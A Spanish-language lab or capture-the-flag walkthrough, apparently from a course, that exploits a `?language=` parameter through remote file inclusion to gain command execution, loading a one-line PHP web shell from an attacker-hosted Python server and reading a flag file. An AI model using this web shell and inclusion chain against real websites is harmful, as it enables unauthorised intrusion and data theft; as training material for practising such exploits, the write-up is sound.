# LFI: RFI -> RCE 👩‍💻

La página web que vulneraremos es:

![Web.PNG](./assets/05-Quinto/01-web.PNG)

* Vemos el **atributo** `?language=<Archivo>.php` en el cual podemos lograr un LFI y, en este caso, derivarlo a un `RCE` 👩‍💻

---

1. Para comprobar si la página es vulnerable a `RFI`, primero levantaremos un **servidor http** con Python 🐍

```
python3 -m http.server 80
```

2. Realizaremos una petición a nuestro servidor a través del parámetro `?language=http://<IP Atancante>:<Puerto>`

3. Vemos los logs del servidor http.

<p align="center">
    <img src="/assets/05-Quinto/02-RFI.PNG">
</p>

* Notamos que el servidor web vulnerable realiza un petición a nuestro servidor **http**, por lo cual, el servidor web es vulnerable a `RFI` 👩‍💻

---

Creamos un script en php que nos permita ejecutar comandos a través del parámetro `cmd`

* `script.php`

    ```php
    <?php system($_GET['cmd']); ?>
    ```

---

Ahora realizamos la petición a este **script** y listamos los archivos de la `ruta del sistema` 💻

* **URL**: `http://<IP Web>/index.php?language=http://<IP Atacante/script.php&cmd=ls /`

<p align="center">
    <img src="/assets/05-Quinto/03-exercise.PNG">
</p>

`Exercise` es un directorio, así que, lo listaremos 

* **URL**: `http://<IP Web>/index.php?language=http://<IP Atacante/script.php&cmd=ls /exercise`

<p align="center">
    <img src="/assets/05-Quinto/04-flag.PNG">
</p>

---

Por último, leemos el archivo `flag.txt`

* **URL**: `http://<IP Web>/index.php?language=http://<IP Atacante/script.php&cmd=cat /exercise/flag.txt`

<p align="center">
    <img src="/assets/05-Quinto/05-final.PNG">
</p>